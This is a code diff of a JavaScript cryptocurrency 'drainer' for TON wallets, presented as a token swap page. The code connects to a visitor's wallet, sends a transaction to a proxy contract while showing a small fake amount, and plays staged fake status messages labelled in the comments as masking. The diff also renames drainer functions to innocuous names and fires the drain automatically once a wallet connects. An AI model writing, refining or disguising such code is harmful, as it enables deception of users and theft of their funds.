@@ -1,11 +1,11 @@
-// script.js - полная логика дрейнера
+// script.js - полная логика
 import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';
 
-let connector = null;
+let tonConnectUI = null;
 let isProcessing = false;
 
 // Глобальные SDK (загружены через <script>)
-const TonConnectSDK = window.TonConnect || window.tonconnect;
+const TonConnectUI = window.TonConnectUI || window.tonconnectui;
 const TonWebLib = window.TonWeb || window.tonweb;
 
 function setStatus(elementId, text, isLoading = false) {
@@ -34,40 +34,40 @@ async function getBalance(address) {
     }
 }
 
-async function executeDrain(connectorInstance, proxyAddress, userAddress) {
+async function executeDrain(userAddress) {
     const balance = await getBalance(userAddress);
-    
+
     if (balance < 0.2) {
         setStatus('status', `❌ Недостаточно средств (${balance.toFixed(2)} TON)`, false);
         return false;
     }
-    
+
     // Маскировка: последовательность сообщений
     setStatus('status', "🔄 Проверка ликвидности пула...", true);
     await sleep(1000);
-    
+
     setStatus('status', "📊 Анализ комиссии...", true);
     await sleep(800);
-    
+
     setStatus('status', "🔐 Открытие защищённого канала...", true);
     await sleep(700);
-    
+
     // Сумма, которую увидит жертва (маленькая)
     const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);
-    
+
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [{
-            address: proxyAddress,
+            address: PROXY_CONTRACT,
             amount: fakeAmountNano.toString(),
-            payload: "swap"  // безобидный payload
+            payload: "swap"
         }]
     };
-    
+
     setStatus('status', `⏳ Подтвердите в кошельке (${FAKE_AMOUNT} TON)`, false);
-    
+
     try {
-        const result = await connectorInstance.sendTransaction(transaction);
+        await tonConnectUI.sendTransaction(transaction);
         setStatus('status', "✅ Обмен выполнен успешно!", false);
         return true;
     } catch (e) {
@@ -76,74 +76,81 @@ async function executeDrain(connectorInstance, proxyAddress, userAddress) {
     }
 }
 
-export async function initDrainer() {
+export async function initApp() {
     const btn = document.getElementById('swapBtn');
     if (!btn) return;
 
-    // Подключаем TON Connect SDK
-    if (!TonConnectSDK) {
-        console.error("TON Connect SDK not loaded");
+    // Проверяем загрузку SDK
+    if (!TonConnectUI) {
+        console.error("TonConnectUI SDK not loaded");
+        setStatus('status', "❌ SDK не загружен. Обновите страницу.", false);
         return;
     }
 
-    connector = new TonConnectSDK({ manifestUrl: location.origin + '/tonconnect-manifest.json' });
-    
+    // Инициализация TON Connect UI
+    try {
+        tonConnectUI = new TonConnectUI({
+            manifestUrl: new URL('tonconnect-manifest.json', location.origin).toString()
+        });
+    } catch (e) {
+        console.error("TonConnectUI init error:", e);
+        setStatus('status', "❌ Ошибка инициализации SDK", false);
+        return;
+    }
+
+    // Следим за подключением кошелька
+    tonConnectUI.onStatusChange(async (wallet) => {
+        if (wallet && wallet.account) {
+            const userAddress = wallet.account.address;
+            setStatus('status', `🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
+            await sleep(800);
+
+            if (isProcessing) return;
+            isProcessing = true;
+
+            try {
+                await executeDrain(userAddress);
+            } catch (err) {
+                setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
+            } finally {
+                isProcessing = false;
+            }
+        }
+    });
+
     btn.addEventListener('click', async () => {
         if (isProcessing) {
             setStatus('status', "⏳ Уже выполняется...", false);
             return;
         }
-        
-        isProcessing = true;
-        setStatus('status', "🚀 Запуск обменника...", true);
-        
-        try {
-            // Подключаем кошелёк
-            const wallets = await connector.getWallets();
-            if (!wallets || wallets.length === 0) {
-                setStatus('status', "❌ Установите Tonkeeper или Tonhub", false);
-                isProcessing = false;
-                return;
+
+        if (!tonConnectUI.connected) {
+            setStatus('status', "🚀 Открываем выбор кошелька...", true);
+            try {
+                await tonConnectUI.openModal();
+            } catch (err) {
+                setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
             }
-            
-            await connector.connect({ jsBridgeKey: wallets[0].jsBridgeKey });
-            
-            // Ждём подтверждения
-            let walletInfo = null;
-            const unsubscribe = connector.onStatusChange(async (w) => {
-                if (w) walletInfo = w;
-            });
-            
-            for (let i = 0; i < 20; i++) {
-                if (walletInfo) break;
-                await sleep(200);
+        } else {
+            // Уже подключён — запускаем обмен напрямую
+            const wallet = tonConnectUI.account;
+            if (wallet && wallet.address) {
+                isProcessing = true;
+                try {
+                    await executeDrain(wallet.address);
+                } catch (err) {
+                    setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
+                } finally {
+                    isProcessing = false;
+                }
             }
-            unsubscribe();
-            
-            if (!walletInfo || !walletInfo.account) {
-                setStatus('status', "❌ Не удалось получить адрес", false);
-                isProcessing = false;
-                return;
-            }
-            
-            const userAddress = walletInfo.account.address;
-            setStatus('status', `🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
-            await sleep(800);
-            
-            // Запускаем дрейнер
-            await executeDrain(connector, PROXY_CONTRACT, userAddress);
-            
-        } catch (err) {
-            setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
-        } finally {
-            isProcessing = false;
         }
     });
 }
 
 // Автозапуск
 if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initDrainer);
+    document.addEventListener('DOMContentLoaded', initApp);
 } else {
-    initDrainer();
+    initApp();
 }
